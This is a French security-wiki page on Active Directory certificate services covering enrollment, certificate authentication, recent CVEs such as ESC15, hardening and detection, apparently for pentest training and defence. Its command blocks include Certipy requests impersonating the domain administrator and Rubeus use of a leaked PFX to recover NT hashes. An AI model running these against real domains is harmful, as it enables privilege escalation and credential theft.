# Certificats AD

{{#include ../../banners/hacktricks-training.md}}

## Introduction

### Composants d’un certificat

- Le **Subject** du certificat désigne son propriétaire.
- Une **Public Key** est associée à une clé privée afin de lier le certificat à son propriétaire légitime.
- La **Validity Period**, définie par les dates **NotBefore** et **NotAfter**, indique la durée de validité du certificat.
- Un **Serial Number** unique, attribué par l’autorité de certification (CA), identifie chaque certificat.
- L’**Issuer** désigne la CA qui a émis le certificat.
- **SubjectAlternativeName** permet d’ajouter des noms pour le sujet, ce qui offre davantage de flexibilité pour l’identification.
- **Basic Constraints** indique si le certificat concerne une CA ou une entité finale et définit les restrictions d’utilisation.
- Les **Extended Key Usages (EKUs)** définissent les usages spécifiques du certificat, comme la signature de code ou le chiffrement des e-mails, au moyen d’identifiants d’objet (OIDs).
- La **Signature Algorithm** précise la méthode de signature du certificat.
- La **Signature**, créée avec la clé privée de l’émetteur, garantit l’authenticité du certificat.<sup>[[4]](#references)</sup>

### Considérations particulières

- Les **Subject Alternative Names (SANs)** étendent l’applicabilité d’un certificat à plusieurs identités, ce qui est essentiel pour les serveurs hébergeant plusieurs domaines. Des processus d’émission sécurisés sont indispensables pour éviter les risques d’usurpation d’identité par des attaquants qui manipulent la spécification SAN.<sup>[[4]](#references)</sup>

### Autorités de certification (CAs) dans Active Directory (AD)

AD CS reconnaît les certificats de CA d’une forêt AD au moyen de conteneurs dédiés, chacun ayant un rôle spécifique :<sup>[[4]](#references)</sup>

- Le conteneur **Certification Authorities** contient les certificats des CA racines approuvées.
- Le conteneur **Enrolment Services** répertorie les CAs d’entreprise et leurs modèles de certificats.
- L’objet **NTAuthCertificates** contient les certificats de CA autorisés pour l’authentification AD.
- Le conteneur **AIA (Authority Information Access)** facilite la validation de la chaîne de certificats grâce aux certificats intermédiaires et aux certificats de CA croisées.

### Obtention d’un certificat : flux de demande de certificat client

1. Le processus de demande commence par la recherche d’une CA d’entreprise par les clients.
2. Une CSR est créée après la génération d’une paire de clés publique et privée. Elle contient une clé publique et d’autres informations.
3. La CA évalue la CSR en fonction des modèles de certificats disponibles et émet le certificat selon les autorisations du modèle.
4. Après approbation, la CA signe le certificat avec sa clé privée et le renvoie au client.<sup>[[4]](#references)</sup>

### Modèles de certificats

Définis dans AD, ces modèles spécifient les paramètres et les autorisations d’émission des certificats, notamment les EKUs autorisés et les droits d’inscription ou de modification. Ils sont essentiels à la gestion de l’accès aux services de certificats.<sup>[[4]](#references)</sup>

**La version du schéma du modèle est importante.** Les modèles **v1** hérités (par exemple, le modèle intégré **WebServer**) ne disposent pas de plusieurs paramètres modernes d’application des règles. Les recherches sur **ESC15/EKUwu** ont montré que, sur les **modèles v1**, un demandeur peut intégrer des **Application Policies/EKUs** dans la CSR, qui sont **prioritaires sur** les EKUs configurés dans le modèle. Cela permet d’obtenir des certificats d’authentification client, d’agent d’inscription ou de signature de code avec les seuls droits d’inscription. Privilégiez les modèles **v2/v3**, supprimez ou remplacez les modèles v1 par défaut et limitez strictement les EKUs à l’usage prévu.<sup>[[1]](#references)</sup>

## Inscription de certificats

Le processus d’inscription de certificats est lancé par un administrateur qui **crée un modèle de certificat**, ensuite **publié** par une autorité de certification (CA) d’entreprise. Le modèle devient alors disponible pour l’inscription des clients. Pour ce faire, le nom du modèle est ajouté au champ `certificatetemplates` d’un objet Active Directory.<sup>[[4]](#references)</sup>

Pour qu’un client puisse demander un certificat, il doit disposer des **droits d’inscription**. Ces droits sont définis par des descripteurs de sécurité sur le modèle de certificat et sur la CA d’entreprise elle-même. Des autorisations doivent être accordées aux deux endroits pour qu’une demande aboutisse.<sup>[[4]](#references)</sup>

### Droits d’inscription sur les modèles

Ces droits sont définis au moyen d’entrées de contrôle d’accès (ACEs), qui précisent des autorisations telles que :<sup>[[4]](#references)</sup>

- Les droits **Certificate-Enrollment** et **Certificate-AutoEnrollment**, chacun associé à un GUID spécifique.
- **ExtendedRights**, qui autorise toutes les autorisations étendues.
- **FullControl/GenericAll**, qui accorde un contrôle complet sur le modèle.

### Droits d’inscription sur les CAs d’entreprise

Les droits de la CA sont définis dans son descripteur de sécurité, accessible via la console de gestion de l’autorité de certification. Certains paramètres permettent même à des utilisateurs disposant de faibles privilèges d’y accéder à distance, ce qui peut poser un problème de sécurité.<sup>[[4]](#references)</sup>

### Contrôles d’émission supplémentaires

Certains contrôles peuvent s’appliquer, notamment :<sup>[[4]](#references)</sup>

- **Approbation du gestionnaire** : place les demandes en attente jusqu’à leur approbation par un gestionnaire de certificats.
- **Agents d’inscription et signatures autorisées** : précisent le nombre de signatures requises sur une CSR et les OIDs de stratégie d’application nécessaires.

### Méthodes de demande de certificats

Les certificats peuvent être demandés via :<sup>[[4]](#references)</sup>

1. Le **Windows Client Certificate Enrollment Protocol** (MS-WCCE), au moyen d’interfaces DCOM.
2. Le **protocole distant ICertPassage** (MS-ICPR), via des canaux nommés ou TCP/IP.
3. L’**interface web d’inscription de certificats**, lorsque le rôle Certificate Authority Web Enrollment est installé.
4. Le **Certificate Enrollment Service** (CES), associé au service Certificate Enrollment Policy (CEP).
5. Le **Network Device Enrollment Service** (NDES), destiné aux périphériques réseau et utilisant le Simple Certificate Enrollment Protocol (SCEP).

Les utilisateurs Windows peuvent également demander des certificats via l’interface graphique (`certmgr.msc` ou `certlm.msc`) ou des outils en ligne de commande (`certreq.exe` ou la commande PowerShell `Get-Certificate`).

```bash
# Example of requesting a certificate using PowerShell
Get-Certificate -Template "User" -CertStoreLocation "cert:\\CurrentUser\\My"
```

## Authentification par certificat

Active Directory (AD) prend en charge l’authentification par certificat, principalement à l’aide des protocoles **Kerberos** et **Secure Channel (Schannel)**.<sup>[[4]](#references)</sup>

### Processus d’authentification Kerberos

Lors du processus d’authentification Kerberos, la demande d’un utilisateur pour obtenir un Ticket Granting Ticket (TGT) est signée à l’aide de la **clé privée** du certificat de l’utilisateur. Le contrôleur de domaine effectue plusieurs validations de cette demande, notamment sur la **validité**, la **chaîne** et l’état de révocation du certificat. Les validations incluent également la vérification que le certificat provient d’une source approuvée et que son émetteur figure dans le **magasin de certificats NTAUTH**. Si les validations réussissent, un TGT est délivré. L’objet **`NTAuthCertificates`** dans AD se trouve à :

```bash
CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<com>
```

est essentiel pour établir la confiance lors de l’authentification par certificat.<sup>[[4]](#references)</sup>

Depuis le déploiement de **KB5014754**, l’authentification moderne de Kerberos par certificat dépend surtout de la **force du mapping**, et pas seulement des EKU.<sup>[[2]](#references)</sup> Dans les forêts renforcées :

- Un certificat qui ne contient qu’un **SAN UPN/DNS** peut ne plus suffire pour l’ouverture de session.
- Le KDC privilégie un **binding fort**, généralement l’extension de sécurité SID (`1.3.6.1.4.1.311.25.2`) ou un mapping explicite fort dans `altSecurityIdentities`.
- Si le certificat ne comporte pas de mapping fort, les DC consignent l’événement **Kdcsvc Event ID 39/41** en mode de compatibilité et refusent l’authentification en mode d’application.
- Dans les chaînes d’attaque combinées, **ESC9/ESC16** sont importants, car ils suppriment l’extension SID des certificats émis ; les opérateurs s’appuient alors sur des mappings explicites ou des formats d’URL SID dans le SAN, lorsque la chaîne d’attaque le permet.

### Authentification par Secure Channel (Schannel)

Schannel permet d’établir des connexions TLS/SSL sécurisées. Lors de la négociation, le client présente un certificat qui, s’il est validé, autorise l’accès.<sup>[[5]](#references)</sup> Le mapping d’un certificat vers un compte AD peut notamment faire appel à la fonction **S4U2Self** de Kerberos ou au **Subject Alternative Name (SAN)** du certificat.<sup>[[4]](#references)</sup>

Schannel constitue également une solution de repli pratique lorsque **PKINIT** n’est pas disponible. Par exemple, si un contrôleur de domaine ne possède pas de certificat **Smart Card Logon** adapté, `certipy auth` ou les outils PKINIT peuvent échouer à obtenir un TGT, mais le même certificat peut tout de même être utilisable avec **LDAPS** ou **LDAP StartTLS** pour l’authentification et les opérations LDAP.

### Énumération des services de certificats AD

Les services de certificats d’AD peuvent être énumérés à l’aide de requêtes LDAP, qui révèlent des informations sur les **Enterprise Certificate Authorities (CA)** et leur configuration. Tout utilisateur authentifié sur le domaine peut y accéder sans privilèges particuliers.<sup>[[4]](#references)</sup> Des outils comme **[Certify](https://github.com/GhostPack/Certify)** et **[Certipy](https://github.com/ly4k/Certipy)** servent à l’énumération et à l’évaluation des vulnérabilités dans les environnements AD CS.<sup>[[6]](#references)</sup>

Voici les commandes permettant d’utiliser ces outils :

```bash
# Enumerate trusted root CA certificates, Enterprise CAs, and web endpoints
Certify.exe cas

# Identify vulnerable templates and dump relevant permissions
Certify.exe find /vulnerable
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /showAdmins

# Certipy 5.x enumeration focused on enabled/vulnerable templates
certipy find -enabled -vulnerable -hide-admins -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Save JSON/CSV output for offline review or BloodHound correlation
certipy find -json -output corp_adcs -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Request a certificate over the Web Enrollment endpoint or DCOM/RPC
certipy req -web -ca corp-CA -target ca.corp.local -template WebServer -upn john@corp.local -dns www.corp.local
certipy req -ca corp-CA -target ca.corp.local -template User -upn administrator@corp.local -sid S-1-5-21-...-500

# Use the issued certificate either for PKINIT or directly for LDAP Schannel auth
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

### Flags d’énumération Certify et PKINIT avec Rubeus

Les variantes de commande Certify suivantes conservent leurs filtres et options de sortie distincts.<sup>[[6]](#references)</sup>

```bash
# Enumerate trusted root CA certificates, Enterprise CAs and HTTP enrollment endpoints
# Useful flags: /domain, /path, /hideAdmins, /showAllPermissions, /skipWebServiceChecks
Certify.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks]

# Identify vulnerable certificate templates and filter for common abuse cases
Certify.exe find
Certify.exe find /vulnerable [/currentuser]
Certify.exe find /enrolleeSuppliesSubject   # ESC1 candidates (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
Certify.exe find /clientauth                # templates with client-auth EKU
Certify.exe find /showAllPermissions        # include template ACLs in output
Certify.exe find /json /outfile:C:\Temp\adcs.json

# Enumerate PKI object ACLs (Enterprise PKI container, templates, OIDs) – useful for ESC4/ESC7 discovery
Certify.exe pkiobjects [/domain:domain.local] [/showAdmins]

# Use Certipy for enumeration and identifying vulnerable templates
certipy find -vulnerable -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

Rubeus peut également utiliser un certificat PFX protégé par mot de passe pour l’authentification PKINIT et demander un TGT. L’option facultative `/getcredentials` demande un ticket de service U2U et tente de récupérer le hash NT du compte :<sup>[[7]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:<USER> /certificate:C:\temp\leaked.pfx /password:<PFX_PASSWORD> /getcredentials /ptt
```

Pour les modèles spécifiques à ESC et l’abus des CA, voir [AD CS Domain Escalation](ad-certificates/domain-escalation.md).

---

## Vulnérabilités récentes et mises à jour de sécurité (2022-2025)

| Année | ID / Nom | Impact | Points clés à retenir |
|------|-----------|--------|----------------|
| 2022 | **CVE-2022-26923** – « Certifried » / ESC6 | *Élévation de privilèges* en usurpant des certificats de comptes machine pendant PKINIT. | Le correctif est inclus dans les mises à jour de sécurité du **10 mai 2022**. Des contrôles d’audit et de mappage fort ont été introduits via **KB5014754** ; les environnements devraient désormais être en mode *Full Enforcement*.  |
| 2023 | **CVE-2023-35350 / 35351** | *Exécution de code à distance* dans les rôles AD CS Web Enrollment (certsrv) et CES. | Les PoC publics sont limités, mais les composants IIS vulnérables sont souvent exposés en interne. Correctif disponible depuis le Patch Tuesday de **juillet 2023**.  |
| 2024 | **CVE-2024-49019** – « EKUwu » / ESC15 | Sur les **modèles v1**, un demandeur disposant de droits d’inscription peut intégrer des **Application Policies/EKUs** dans la CSR, lesquelles sont prioritaires sur les EKUs du modèle, produisant ainsi des certificats d’authentification client, d’agent d’inscription ou de signature de code. | Corrigé depuis le **12 novembre 2024**. Remplacez ou remplacez par une version plus récente les modèles v1 (par ex. le modèle WebServer par défaut), limitez les EKUs à l’usage prévu et restreignez les droits d’inscription. |

### Chronologie du renforcement de la sécurité Microsoft (KB5014754)

Microsoft a introduit un déploiement en trois phases (Compatibility → Audit → Enforcement) pour abandonner les mappages implicites faibles pour l’authentification par certificat Kerberos. Depuis le **11 février 2025**, les contrôleurs de domaine passent automatiquement en mode **Full Enforcement** si la valeur de registre `StrongCertificateBindingEnforcement` n’est pas définie. Microsoft a ensuite modifié le calendrier afin que le retour au mode de compatibilité reste possible jusqu’à la mise à jour de sécurité du **9 septembre 2025**.<sup>[[2]](#references)</sup> Les administrateurs devraient :

1. Installer les correctifs sur tous les contrôleurs de domaine et serveurs AD CS (mai 2022 ou version ultérieure).
2. Surveiller les événements ID 39/41 pour repérer les mappages faibles pendant la phase *Audit*.
3. Réémettre les certificats d’authentification client avec la nouvelle **extension SID** ou configurer des mappages manuels forts avant que l’application des règles ne bloque les mappages faibles.

### Notes pour les opérateurs de forêts renforcées

- **ESC1/ESC6 ne suffisent plus à eux seuls** dans les environnements 2025+. Si vous demandez un certificat pour un autre principal, vous avez généralement aussi besoin d’un élément de mappage fort, tel que l’extension SID ou un mappage explicite.
- **ESC15 (EKUwu)** est surtout utile dans les environnements non corrigés, car il transforme des modèles **v1** inoffensifs, tels que **WebServer**, en certificats capables d’authentification ou d’agir comme agent d’inscription en injectant des **Application Policies**. Kerberos PKINIT évalue toujours les EKUs, mais **LDAP Schannel** tient également compte des Application Policies, ce qui rend toujours pertinent l’abus reposant sur LDAP.<sup>[[1]](#references)</sup>
- **ESC16** est un paramètre à l’échelle de la CA : si la CA désactive globalement l’extension de sécurité SID, chaque certificat émis revient à un comportement de mappage plus faible, sauf si la chaîne d’attaque injecte un SID dans un autre format pris en charge.
- **Les droits ESC7 sont distincts :** une autorisation `ManageCA` sur une CA peut permettre de modifier des paramètres tels que `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6), tandis que `ManageCertificates` régit l’approbation des demandes. Un refus explicite des droits de gestion des certificats peut bloquer cette voie d’approbation même si une autorisation Allow est également présente ; évaluez la liste de contrôle d’accès (ACL) effective de la CA avant de chaîner paramètres et modèles. Voir [l’évaluation des ACL de CA par Microsoft](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-vulnerable-ca-setting).

---

## Améliorations de la détection et du renforcement de la sécurité

* Le **capteur AD CS de Defender for Identity (2023-2024)** met désormais en évidence les évaluations de la posture de sécurité pour ESC1-ESC8/ESC11 et génère des alertes en temps réel telles que *« Émission d’un certificat de contrôleur de domaine pour un appareil non-contrôleur de domaine »* (ESC8) et *« Empêcher l’inscription de certificats avec des Application Policies arbitraires »* (ESC15). Déployez des capteurs sur tous les serveurs AD CS pour bénéficier de ces détections.<sup>[[3]](#references)</sup>
* Désactivez l’option **« Supply in the request »** sur tous les modèles ou limitez-la strictement ; privilégiez des valeurs SAN/EKU définies explicitement.
* Supprimez **Any Purpose** ou **No EKU** des modèles, sauf nécessité absolue (répond aux scénarios ESC2).
* Exigez l’approbation d’un responsable ou des workflows dédiés d’Enrollment Agent pour les modèles sensibles (par ex. WebServer / CodeSigning).
* Restreignez les points de terminaison Web Enrollment (`certsrv`) et CES/NDES aux réseaux de confiance ou placez-les derrière une authentification par certificat client.
* Appliquez le chiffrement de l’inscription RPC (`certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST`) pour atténuer ESC11 (relais RPC). L’option est **activée par défaut**, mais elle est souvent désactivée pour les clients anciens, ce qui réintroduit le risque de relais.
* Sécurisez les **points de terminaison d’inscription basés sur IIS** (CES/Certsrv) : désactivez NTLM lorsque c’est possible ou exigez HTTPS + Extended Protection pour bloquer les relais ESC8.

Évaluez ESC11 sur l’hôte qui exécute la CA, qui peut être un serveur membre du domaine plutôt qu’un contrôleur de domaine. Lisez `InterfaceFlags` de la CA active dans `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration` ; une valeur illisible ou absente indique un résultat inconnu, et non la preuve que le chiffrement RPC est désactivé. Un bit `IF_ENFORCEENCRYPTICERTREQUEST` à zéro constitue un indice de configuration, mais il faut également un point de terminaison RPC d’inscription accessible, des identifiants dont l’authentification peut être forcée et un modèle de certificat utilisable. Pour ESC8, un défi HTTP NTLM à lui seul ne suffit pas : confirmez qu’il existe un point de terminaison d’inscription fonctionnel.

---

## References

- [1] [EKUwu : pas simplement un autre ESC AD CS](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [2] [KB5014754 : modifications de l’authentification par certificat sur les contrôleurs de domaine Windows](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [3] [Évaluations de la posture de sécurité des certificats - Microsoft Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates)
- [4] [Certified Pre-Owned : abus des services de certificats Active Directory](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [5] [Qu’est-ce que l’authentification client SSL/TLS et comment fonctionne-t-elle ?](https://comodosslstore.com/blog/what-is-ssl-tls-client-authentication-how-does-it-work.html)
- [6] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [7] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
{{#include ../../banners/hacktricks-training.md}}
